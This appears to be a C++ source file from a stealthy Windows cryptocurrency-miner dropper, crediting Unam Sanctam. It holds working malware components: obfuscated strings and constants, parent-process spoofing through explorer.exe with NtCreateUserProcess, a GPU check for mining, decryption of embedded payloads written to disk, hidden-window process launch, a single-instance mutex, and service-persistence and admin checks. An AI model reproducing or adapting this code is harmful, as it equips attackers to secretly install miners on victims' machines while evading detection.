#include "common.h"

#include "ntddk.h"
#include "obfuscateu.h"

UNICODE_STRING init_unicode_string(wchar_t* source_string) {
    UNICODE_STRING result = { 0 };
    result.MaximumLength = (USHORT)(wcslen(source_string) * AYU_OBFC(sizeof(WCHAR)) + AYU_OBFC(sizeof(WCHAR)));
    result.Length = result.MaximumLength - AYU_OBFC(sizeof(WCHAR));
    result.Buffer = source_string;
    return result;
}

#define INITIALIZE_NT_OBJECT_ATTRIBUTES(path) \
    wchar_t ntPath[MAX_PATH + 4] = { 0 }; \
    combine_path(ntPath, AYU_OBFW(L"\\??\\"), path); \
    UNICODE_STRING unicode_path = init_unicode_string(ntPath); \
    OBJECT_ATTRIBUTES attr = { 0 }; \
    InitializeObjectAttributes(&attr, &unicode_path, AYU_OBFC(OBJ_CASE_INSENSITIVE), NULL, NULL);

PROCESS_INFORMATION create_new_process_internal(LPWSTR programPath, LPWSTR cmdLine, LPWSTR startDir, LPWSTR runtimeData, DWORD processFlags, DWORD threadFlags) {
    /*
        Custom NtCreateUserProcess creation painstakingly made by Unam Sanctam https://github.com/UnamSanctam
    */
    HANDLE hParent = NULL, hToken = NULL;
    PVOID buffer = NULL;
    SIZE_T bufferLength = 0;
    NTSTATUS status = -1;

    while (true) {
        status = UtQuerySystemInformation(SystemProcessInformation, buffer, (ULONG)bufferLength, (PULONG)&bufferLength);
        if (status != AYU_OBFC(STATUS_INFO_LENGTH_MISMATCH)) {
            break;
        }
        UtAllocateVirtualMemory(UtCurrentProcess(), &buffer, 0, &bufferLength, AYU_OBFC(MEM_COMMIT | MEM_RESERVE), AYU_OBFC(PAGE_READWRITE));
    }
    if (NT_SUCCESS(status)) {
        ULONG ofs = 0;
        while (true) {
            PSYSTEM_PROCESS_INFORMATION pspi = (PSYSTEM_PROCESS_INFORMATION)((BYTE*)buffer + ofs);
            if (pspi->ImageName.Length > 0 && !wcsncmp(pspi->ImageName.Buffer, AYU_OBFW(L"explorer.exe"), AYU_OBFC(12))) {
                OBJECT_ATTRIBUTES oa;
                InitializeObjectAttributes(&oa, 0, 0, 0, 0);
                CLIENT_ID id = { pspi->UniqueProcessId, NULL };

                if (NT_SUCCESS(UtOpenProcess(&hParent, AYU_OBFC(PROCESS_CREATE_PROCESS), &oa, &id))) {
                    break;
                }
            }
            if (!pspi->NextEntryOffset || ofs + pspi->NextEntryOffset >= bufferLength) {
                break;
            }
            ofs += pspi->NextEntryOffset;
        }
    }
    UtFreeVirtualMemory(UtCurrentProcess(), &buffer, &bufferLength, AYU_OBFC(MEM_RELEASE));

    if (!hParent) {
        hParent = UtCurrentProcess();
    }

    UtOpenProcessToken(UtCurrentProcess(), AYU_OBFC(TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE), &hToken);

    PUT_PEB_EXT parentPEB = (PUT_PEB_EXT)SWU_GetPEB();

    wchar_t ntPath[MAX_PATH + 4] = { 0 };
    combine_path(ntPath, AYU_OBFW(L"\\??\\"), programPath);
    UNICODE_STRING nt_program_path = init_unicode_string(ntPath);
    UNICODE_STRING start_directory = startDir ? init_unicode_string(startDir) : parentPEB->ProcessParameters->CurrentDirectory.DosPath;
    UNICODE_STRING command_line = cmdLine ? init_unicode_string(cmdLine) : nt_program_path;
    UNICODE_STRING ShellInfo = init_unicode_string(runtimeData ? runtimeData : AYU_OBFW(L""));

    ULONG totalsize = AYU_OBFC(sizeof(RTL_USER_PROCESS_PARAMETERS))
        + start_directory.Length
        + nt_program_path.Length
        + parentPEB->ProcessParameters->DllPath.Length
        + command_line.Length
        + ShellInfo.Length
        + AYU_OBFC(6);

    PVOID ProcessParametersData = NULL;
    SIZE_T ProcessParametersSize = totalsize;
    UtAllocateVirtualMemory(UtCurrentProcess(), &ProcessParametersData, 0, &ProcessParametersSize, AYU_OBFC(MEM_RESERVE | MEM_COMMIT), AYU_OBFC(PAGE_READWRITE));

    PRTL_USER_PROCESS_PARAMETERS ProcessParameters = (RTL_USER_PROCESS_PARAMETERS*)ProcessParametersData;
    ProcessParameters->MaximumLength = totalsize;
    ProcessParameters->Length = totalsize;
    ProcessParameters->Flags = AYU_OBFC(1);
    ProcessParameters->ConsoleHandle = HANDLE_CREATE_NO_WINDOW;
    ProcessParameters->CurrentDirectory.DosPath = start_directory;
    ProcessParameters->DllPath = parentPEB->ProcessParameters->DllPath;
    ProcessParameters->ImagePathName = nt_program_path;
    ProcessParameters->CommandLine = command_line;
    ProcessParameters->Environment = parentPEB->ProcessParameters->Environment;
    ProcessParameters->ShellInfo = ShellInfo;
    ProcessParameters->EnvironmentSize = parentPEB->ProcessParameters->EnvironmentSize;

    PS_CREATE_INFO CreateInfo = { 0 };
    CreateInfo.Size = AYU_OBFC(sizeof(CreateInfo));
    CreateInfo.State = PsCreateInitialState;

    PVOID AttributeListData = NULL;
    SIZE_T AttributeListSize = AYU_OBFC(sizeof(PS_ATTRIBUTE) * 3);
    UtAllocateVirtualMemory(UtCurrentProcess(), &AttributeListData, 0, &AttributeListSize, AYU_OBFC(MEM_RESERVE | MEM_COMMIT), AYU_OBFC(PAGE_READWRITE));
    PPS_ATTRIBUTE_LIST AttributeList = (PS_ATTRIBUTE_LIST*)AttributeListData;
    AttributeList->TotalLength = AYU_OBFC(sizeof(PS_ATTRIBUTE_LIST));

    AttributeList->Attributes[0].Attribute = AYU_OBFC(0x20005);
    AttributeList->Attributes[0].Size = nt_program_path.Length;
    AttributeList->Attributes[0].u1.Value = (ULONG_PTR)nt_program_path.Buffer;

    AttributeList->Attributes[1].Attribute = AYU_OBFC(0x60000);
    AttributeList->Attributes[1].Size = AYU_OBFC(sizeof(HANDLE));
    AttributeList->Attributes[1].u1.ValuePtr = hParent;

    AttributeList->Attributes[2].Attribute = AYU_OBFC(0x60002);
    AttributeList->Attributes[2].Size = AYU_OBFC(sizeof(HANDLE));
    AttributeList->Attributes[2].u1.ValuePtr = hToken;

    PROCESS_INFORMATION pi = { 0 };
    UtCreateUserProcess(&pi.hProcess, &pi.hThread, AYU_OBFC(PROCESS_ALL_ACCESS), AYU_OBFC(THREAD_ALL_ACCESS), NULL, NULL, processFlags, threadFlags, ProcessParameters, &CreateInfo, AttributeList);

    UtFreeVirtualMemory(UtCurrentProcess(), &ProcessParametersData, &ProcessParametersSize, AYU_OBFC(MEM_RELEASE));
    UtFreeVirtualMemory(UtCurrentProcess(), &AttributeListData, &AttributeListSize, AYU_OBFC(MEM_RELEASE));
    UtClose(hToken);
    UtClose(hParent);

    return pi;
}

bool has_gpu() {
    UNICODE_STRING regKey = init_unicode_string(AYU_OBFW(L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}\\"));
    UNICODE_STRING providerKey = init_unicode_string(AYU_OBFW(L"ProviderName"));

    HANDLE hKey = NULL;
    ULONG infoLength = 0;
    BYTE subKeyBuffer[256] = { 0 };
    BYTE valueBuffer[512] = { 0 };
    OBJECT_ATTRIBUTES attr = { 0 };
    InitializeObjectAttributes(&attr, &regKey, AYU_OBFC(OBJ_CASE_INSENSITIVE), NULL, NULL);
    if (NT_SUCCESS(UtOpenKey(&hKey, AYU_OBFC(KEY_ENUMERATE_SUB_KEYS), &attr))) {
        for (ULONG i = 0; UtEnumerateKey(hKey, i, KeyBasicInformation, subKeyBuffer, AYU_OBFC(sizeof(subKeyBuffer)), &infoLength) != AYU_OBFC(STATUS_NO_MORE_ENTRIES); ++i) {
            HANDLE hSubKey = NULL;
            regKey.Buffer = ((PKEY_BASIC_INFORMATION)subKeyBuffer)->Name;
            regKey.Length = (USHORT)((PKEY_BASIC_INFORMATION)subKeyBuffer)->NameLength;
            regKey.MaximumLength = regKey.Length;
            InitializeObjectAttributes(&attr, &regKey, AYU_OBFC(OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE), hKey, NULL);
            if (NT_SUCCESS(UtOpenKey(&hSubKey, AYU_OBFC(KEY_QUERY_VALUE), &attr))) {
                if (NT_SUCCESS(UtQueryValueKey(hSubKey, &providerKey, KeyValueFullInformation, valueBuffer, AYU_OBFC(sizeof(valueBuffer)), &infoLength))) {
                    wchar_t* providerName = (wchar_t*)((BYTE*)valueBuffer + ((PKEY_VALUE_FULL_INFORMATION)valueBuffer)->DataOffset);
                    if (wcsnicmp(providerName, AYU_OBFW(L"NVIDIA"), AYU_OBFC(6)) == 0 ||
                        wcsnicmp(providerName, AYU_OBFW(L"AMD"), AYU_OBFC(3)) == 0 ||
                        wcsnicmp(providerName, AYU_OBFW(L"ATI"), AYU_OBFC(3)) == 0 ||
                        wcsstr(providerName, AYU_OBFW(L"Advanced Micro Devices")) != NULL)
                    {
                        UtClose(hSubKey);
                        UtClose(hKey);
                        return true;
                    }
                }
                UtClose(hSubKey);
            }
        }
        UtClose(hKey);
    }
    return false;
}

void run_program(bool wait, wchar_t* startDir, wchar_t* programPath, wchar_t* cmdLine, ...) {
    wchar_t cmdLineFormatted[MAX_COMMAND_LENGTH] = { 0 };
    va_list argptr;
    va_start(argptr, cmdLine);
    int len = 0;
    const wchar_t* p = cmdLine;
    while (*p != AYU_OBFC(L'\0') && len < AYU_OBFC(MAX_COMMAND_LENGTH - 1)) {
        if (*p == AYU_OBFC(L'%')) {
            p++;
            if (*p == AYU_OBFC(L'S')) {
                const wchar_t* arg = va_arg(argptr, wchar_t*);
                while (*arg != AYU_OBFC(L'\0') && len < AYU_OBFC(MAX_COMMAND_LENGTH - 1)) {
                    cmdLineFormatted[len++] = *arg++;
                }
            }
        }
        else {
            cmdLineFormatted[len++] = *p;
        }
        if (*p != AYU_OBFC(L'\0')) {
            p++;
        }
    }
    cmdLineFormatted[len] = AYU_OBFC(L'\0');
    va_end(argptr);

    PROCESS_INFORMATION pi = create_new_process_internal(programPath, cmdLineFormatted, startDir, nullptr, 0, 0);
    UtClose(pi.hThread);
    if (wait) {
        LARGE_INTEGER waittime = { 0 };
        waittime.QuadPart = -(AYU_OBFC(30000 * 10000));
        UtWaitForSingleObject(pi.hProcess, FALSE, &waittime);
    }
    UtClose(pi.hProcess);
}

unsigned char* resource_decrypt(unsigned char* data, size_t in_len, size_t* out_len) {
    cipher(data, in_len);
    *out_len = (in_len / AYU_OBFC(4)) * AYU_OBFC(3);

    unsigned char* dec;
    SIZE_T size = *out_len;
    PVOID base = NULL;
    UtAllocateVirtualMemory(UtCurrentProcess(), &base, 0, &size, AYU_OBFC(MEM_COMMIT), AYU_OBFC(PAGE_READWRITE));
    dec = (unsigned char*)base;

    for (size_t i = 0, j = 0; i < in_len;) {
        unsigned int vals[4] = { 0 };
        for (int k = 0; k < AYU_OBFC(4); ++k) {
            unsigned char c = data[i + k];
            vals[k] = (c >= AYU_OBFC('A') && c <= AYU_OBFC('Z')) ? c - AYU_OBFC('A') :
                (c >= AYU_OBFC('a') && c <= AYU_OBFC('z')) ? c - AYU_OBFC('a') + AYU_OBFC(26) :
                (c >= AYU_OBFC('0') && c <= AYU_OBFC('9')) ? c - AYU_OBFC('0') + AYU_OBFC(52) :
                (c == AYU_OBFC('+')) ? (int)AYU_OBFC(62) : (c == AYU_OBFC('/')) ? (int)AYU_OBFC(63) : 0;
        }

        unsigned int b = (vals[0] << AYU_OBFC(18)) | (vals[1] << AYU_OBFC(12)) | (vals[2] << AYU_OBFC(6)) | vals[3];
        dec[j++] = (unsigned char)(b >> AYU_OBFC(16));
        if (j < *out_len) dec[j++] = (unsigned char)(b >> AYU_OBFC(8));
        if (j < *out_len) dec[j++] = (unsigned char)b;
        i += AYU_OBFC(4);
    }

    cipher(dec, *out_len);
    return dec;
}

void resource_free(void* ptr, size_t size) {
    SIZE_T regionSize = size;
    PVOID base = ptr;
    UtFreeVirtualMemory(UtCurrentProcess(), &base, &regionSize, AYU_OBFC(MEM_RELEASE));
}

char manualXOR(char a, char b) {
    char result = 0;
    for (int i = 0; i < AYU_OBFC(8); ++i) {
        result |= (((a >> i) & AYU_OBFC(1)) != ((b >> i) & AYU_OBFC(1))) << i;
    }
    return result;
}

void cipher(unsigned char* data, SIZE_T datalen) {
    for (int i = 0; i < datalen; ++i) {
        data[i] = manualXOR(data[i], AYU_OBFA("#CIPHERKEY")[i % AYU_OBFC(32)]);
    }
}

void write_resource(unsigned char* resource_data, ULONG datalen, wchar_t* base_path, wchar_t* file) {
    wchar_t path[MAX_PATH] = { 0 };
    combine_path(path, base_path, file);
    SIZE_T out_len = 0;
    unsigned char* resource_decrypted = resource_decrypt(resource_data, datalen, &out_len);
    write_file(path, resource_decrypted, out_len);
    resource_free(resource_decrypted, out_len);
}

bool check_mutex(wchar_t* mutex) {
    bool mutexActive = false;
    if (mutex != NULL) {
        UNICODE_STRING umutex = init_unicode_string(mutex);
        OBJECT_ATTRIBUTES attr = { 0 };
        InitializeObjectAttributes(&attr, &umutex, 0, NULL, NULL);

        HANDLE hMutex = NULL;
        mutexActive = !NT_SUCCESS(UtCreateMutant(&hMutex, AYU_OBFC(MUTANT_ALL_ACCESS), &attr, FALSE)) || hMutex == INVALID_HANDLE_VALUE || hMutex == NULL;
        UtClose(hMutex);
    }
    return mutexActive;
}

void combine_path(wchar_t* src, wchar_t* base_path, wchar_t* ext_path) {
    wcscpy(src, base_path);
    wcscat(src, ext_path);
}

wchar_t* get_env(wchar_t* env, wchar_t* env_name) {
    size_t env_name_len = wcslen(env_name);
    for (; *env; env += wcslen(env) + 1) {
        if (wcsnicmp(env, env_name, env_name_len) == 0) {
            return env + env_name_len;
        }
    }
    return nullptr;
}

bool install_check(wchar_t* imagePath) {
    HANDLE hServiceKey = NULL;
    UNICODE_STRING regKey = init_unicode_string(AYU_OBFW(L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\#STARTUPENTRYNAME"));
    OBJECT_ATTRIBUTES attr = { 0 };
    InitializeObjectAttributes(&attr, &regKey, AYU_OBFC(OBJ_CASE_INSENSITIVE), NULL, NULL);

    if (!NT_SUCCESS(UtOpenKey(&hServiceKey, AYU_OBFC(KEY_QUERY_VALUE), &attr))) return false;

    UCHAR buffer[512] = { 0 };
    PKEY_VALUE_PARTIAL_INFORMATION pValueInfo = (PKEY_VALUE_PARTIAL_INFORMATION)buffer;

    ULONG length;
    UNICODE_STRING uvalue = init_unicode_string(AYU_OBFW(L"ImagePath"));
    if (!NT_SUCCESS(UtQueryValueKey(hServiceKey, &uvalue, KeyValuePartialInformation, buffer, AYU_OBFC(sizeof(buffer)), &length)) || wcsnicmp(imagePath, (wchar_t*)pValueInfo->Data, pValueInfo->DataLength / AYU_OBFC(sizeof(wchar_t))) != 0) {
        UtClose(hServiceKey);
        return false;
    }

    uvalue = init_unicode_string(AYU_OBFW(L"Start"));
    if (!NT_SUCCESS(UtQueryValueKey(hServiceKey, &uvalue, KeyValuePartialInformation, buffer, AYU_OBFC(sizeof(buffer)), &length)) || AYU_OBFC(2) != *(DWORD*)pValueInfo->Data) {
        UtClose(hServiceKey);
        return false;
    }

    UtClose(hServiceKey);
    return true;
}

void create_recursive_directory(wchar_t* dir_path) {
    HANDLE file = NULL;
    IO_STATUS_BLOCK status_block = { 0 };

    wchar_t part_path[MAX_PATH] = { 0 };
    wchar_t* ptr = part_path;

    for (; *dir_path; ++dir_path, ++ptr) {
        *ptr = *dir_path;
        if (*dir_path == AYU_OBFC(L'\\') || *dir_path == AYU_OBFC(L'/')) {
            INITIALIZE_NT_OBJECT_ATTRIBUTES(part_path)
            if (NT_SUCCESS(UtCreateFile(&file, AYU_OBFC(FILE_GENERIC_WRITE), &attr, &status_block, NULL, AYU_OBFC(FILE_ATTRIBUTE_NORMAL), 0, AYU_OBFC(FILE_OPEN_IF), AYU_OBFC(FILE_DIRECTORY_FILE), NULL, 0))) {
                UtClose(file);
            }
            if (!*(dir_path + AYU_OBFC(1))) break;
        }
    }
}

PVOID read_file(wchar_t* filePath, ULONG* outFileSize) {
    INITIALIZE_NT_OBJECT_ATTRIBUTES(filePath)

    HANDLE hFile = NULL;
    IO_STATUS_BLOCK status_block = { 0 };
    if (!NT_SUCCESS(UtOpenFile(&hFile, AYU_OBFC(SYNCHRONIZE | GENERIC_READ), &attr, &status_block, AYU_OBFC(FILE_SHARE_READ), AYU_OBFC(FILE_SYNCHRONOUS_IO_NONALERT)))) {
        return NULL;
    }

    FILE_STANDARD_INFORMATION fileInfo = { 0 };
    if (!NT_SUCCESS(UtQueryInformationFile(hFile, &status_block, &fileInfo, AYU_OBFC(sizeof(fileInfo)), FileStandardInformation))) {
        UtClose(hFile);
        return NULL;
    }

    *outFileSize = fileInfo.EndOfFile.QuadPart;
    PVOID fileData = NULL;

    SIZE_T allocatedSize = fileInfo.EndOfFile.QuadPart;
    if (!NT_SUCCESS(UtAllocateVirtualMemory(UtCurrentProcess(), &fileData, 0, &allocatedSize, AYU_OBFC(MEM_RESERVE | MEM_COMMIT), AYU_OBFC(PAGE_READWRITE))) || !NT_SUCCESS(UtReadFile(hFile, NULL, NULL, NULL, &status_block, fileData, *outFileSize, NULL, NULL))) {
        UtClose(hFile);
        *outFileSize = 0;
        return NULL;
    }

    UtClose(hFile);
    return fileData;
}

void write_file(wchar_t* file_path, PVOID paylad_buf, ULONG payload_size) {
    create_recursive_directory(file_path);

    INITIALIZE_NT_OBJECT_ATTRIBUTES(file_path)

    HANDLE hFile = NULL;
    IO_STATUS_BLOCK status_block = { 0 };
    if (NT_SUCCESS(UtCreateFile(&hFile, AYU_OBFC(DELETE | SYNCHRONIZE | GENERIC_READ | GENERIC_WRITE), &attr, &status_block, NULL, AYU_OBFC(FILE_ATTRIBUTE_NORMAL), AYU_OBFC(FILE_SHARE_READ | FILE_SHARE_WRITE), AYU_OBFC(FILE_SUPERSEDE), AYU_OBFC(FILE_SYNCHRONOUS_IO_NONALERT), NULL, 0))) {
        UtWriteFile(hFile, NULL, NULL, NULL, &status_block, paylad_buf, payload_size, NULL, NULL);
        UtClose(hFile);
    }
}

void delete_file(wchar_t* file_path) {
    INITIALIZE_NT_OBJECT_ATTRIBUTES(file_path)

    HANDLE hFile = NULL;
    IO_STATUS_BLOCK status_block = { 0 };
    if (NT_SUCCESS(UtOpenFile(&hFile, AYU_OBFC(DELETE | SYNCHRONIZE | GENERIC_WRITE), &attr, &status_block, AYU_OBFC(FILE_SHARE_WRITE), AYU_OBFC(FILE_SUPERSEDE | FILE_SYNCHRONOUS_IO_NONALERT)))) {
        FILE_DISPOSITION_INFORMATION info = { 0 };
        info.DeleteFile = TRUE;

        UtSetInformationFile(hFile, &status_block, &info, AYU_OBFC(sizeof(info)), FileDispositionInformation);
        UtClose(hFile);
    }
}

bool check_administrator() {
    HANDLE hToken = NULL;
	UtOpenProcessToken(UtCurrentProcess(), AYU_OBFC(TOKEN_QUERY), &hToken);
    TOKEN_ELEVATION elevation;
    ULONG ul = 0;
    if (hToken && NT_SUCCESS(UtQueryInformationToken(hToken, TokenElevation, &elevation, AYU_OBFC(sizeof(elevation)), &ul))) {
        UtClose(hToken);
        return elevation.TokenIsElevated;
    }
    return false;
}

void rename_key_registry(wchar_t* current_key, wchar_t* new_key) {
    UNICODE_STRING uckey = init_unicode_string(current_key);
    OBJECT_ATTRIBUTES attr = { 0 };
    InitializeObjectAttributes(&attr, &uckey, AYU_OBFC(OBJ_CASE_INSENSITIVE), NULL, NULL);

    HANDLE hKey = NULL;
    if (NT_SUCCESS(UtOpenKey(&hKey, AYU_OBFC(KEY_WRITE | KEY_CREATE_SUB_KEY | DELETE), &attr))) {
        UNICODE_STRING unkey = init_unicode_string(new_key);
        UtRenameKey(hKey, &unkey);
        UtClose(hKey);
    }
}